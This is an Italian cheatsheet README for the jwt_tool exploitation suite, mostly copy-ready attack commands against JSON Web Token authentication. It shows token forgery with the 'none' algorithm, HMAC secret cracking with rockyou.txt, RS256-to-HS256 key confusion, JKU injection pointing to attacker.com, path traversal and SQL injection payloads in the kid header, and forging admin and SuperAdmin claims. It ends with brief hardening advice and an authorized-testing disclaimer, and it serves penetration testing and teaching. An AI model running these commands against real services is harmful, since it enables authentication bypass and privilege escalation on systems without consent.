<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<palign="centro">
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sicurezza Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<palign="centro">
  <b>🪙 Potente toolkit CLI Python per analizzare, manomettere, forgiare, scansionare e crackare JSON Web Token (JWT)</b>
</p>

---

## 📋 Sommario

- [Panoramica e anatomia JWT](#-panoramica--jwt-anatomia)
- [Installazione](#-installazione)
- [Analisi e ispezione token](#-token-parsing--ispezione)
- [Scansione automatica delle vulnerabilità (`-M at`)](#-automated-vulnerability-scanning--m-at)
- [Scenari di sfruttamento comuni](#-scenari-di-sfruttamento-comuni)
  - [Confusione algoritmo/Nessuno attacco (`none`)](#confusione-algoritmo--nessuno-attacco-nessuno)
  - [Cracking della chiave segreta HMAC](#hmac-cracking-della-chiave-segreta)
  - [Confusione chiave: da RS256 a HS256 con chiave pubblica](#key-confusion-rs256-to-hs256-with-public-key)
  - [Inserimento intestazione: spoofing JKU, X5U e JWK](#header-injection-jku-x5u--jwk-spoofing)
  - [Iniezione KID (SQLi e percorso trasversale)](#kid-injection-sqli--percorso-traversale)
- [Reclami per manomissione e falsificazione del carico utile](#-tampering-payload--forging-claims)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rafforzamento](#-considerazioni-difensive--rinforzo)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e anatomia JWT

Un token Web JSON (RFC 7519) è costituito da tre segmenti con codifica Base64URL separati da punti (`.`):
`header.payload.signature`

1. **Intestazione:** Identifica il tipo di token (`typ`) e l'algoritmo di firma (`alg`, ad esempio `HS256`, `RS256`, `none`).
2. **Payload:** contiene le attestazioni dell'utente (`sub`, `role`, `admin`, `exp`).
3. **Firma:** Hash di verifica crittografica che impedisce la manomissione sul lato client.

Creato da **ticarpi**, **jwt_tool** automatizza i test per individuare difetti di architettura e implementazione nei flussi di lavoro di autenticazione JWT attraverso API e applicazioni web moderne.

---

## 📥Installazione
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 Analisi e ispezione dei token

Decodifica e controlla i parametri dell'intestazione e le attestazioni del payload:
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ Scansione automatizzata delle vulnerabilità (`-M at`)

Avvia scansioni automatizzate del playbook per testare le vulnerabilità note rispetto a un servizio Web di destinazione:
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*Test eseguiti:*
- Eliminazione della firma (nessuna variante dell'algoritmo)
- Confusione dei tasti da RSA a HMAC
- Richiesta di manomissione (`admin=true`, escalation dei privilegi)
- Iniezione nelle testate `kid`, `jku`, `x5u`
- Gestione della firma vuota

---

## 💥 Scenari di sfruttamento comuni

### Confusione algoritmo/Nessuno attacco (`none`)
Quando le implementazioni di backend accettano token non firmati:
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*Varianti testate automaticamente:* `none`, `None`, `NONE`, `nOnE`.

### Cracking della chiave segreta HMAC
Quando HS256/HS384/HS512 utilizza una passphrase debole:
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### Confusione chiave: da RS256 a HS256 con chiave pubblica
Se il server firma con RSA (RS256) ma accetta HMAC (HS256) utilizzando il proprio certificato pubblico come chiave HMAC condivisa:
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### Iniezione di intestazioni: spoofing JKU, X5U e JWK
Inserimento di chiavi o URL controllati dall'aggressore:
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### Iniezione KID (SQLi e percorso trasversale)
Se il backend utilizza il parametro dell'intestazione `kid` (ID chiave) direttamente nelle query del database o nei percorsi dei file:
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ Reclami per manomissione e falsificazione del carico utile

Modifica valori di attestazione specifici e dimetti il token:
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Decodifica e analizza token** | `python3 jwt_tool.py <JWT>` |
| **Scansione playbook tutto in uno** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **Crack HMAC Segreto** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **Bypass con algoritmo Nessuno** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> Confusione HS256** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **Carico utile e firma antimanomissione** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **Attraversamento del percorso KID** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ Considerazioni difensive e rafforzamento

1. **Whitelist con algoritmo rigoroso:** Non accettare mai `none` o il cambio di algoritmo. Verifica esplicitamente gli algoritmi previsti (solo `RS256`).
2. **Rifiuta chiavi controllate dal client:** non fidarti ciecamente delle intestazioni `jku`, `jwk` o `x5u` provenienti da input non attendibili senza liste consentite di dominio rigorose.
3. **Utilizza segreti complessi:** assicurati che le chiavi HMAC contengano almeno 256 bit di byte crittografici casuali ad alta entropia.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> jwt_tool è progettato esclusivamente per test di penetrazione autorizzati, valutazioni della vulnerabilità delle API e ricerca educativa. La falsificazione di token per accedere a sistemi non autorizzati senza autorizzazione scritta è strettamente illegale.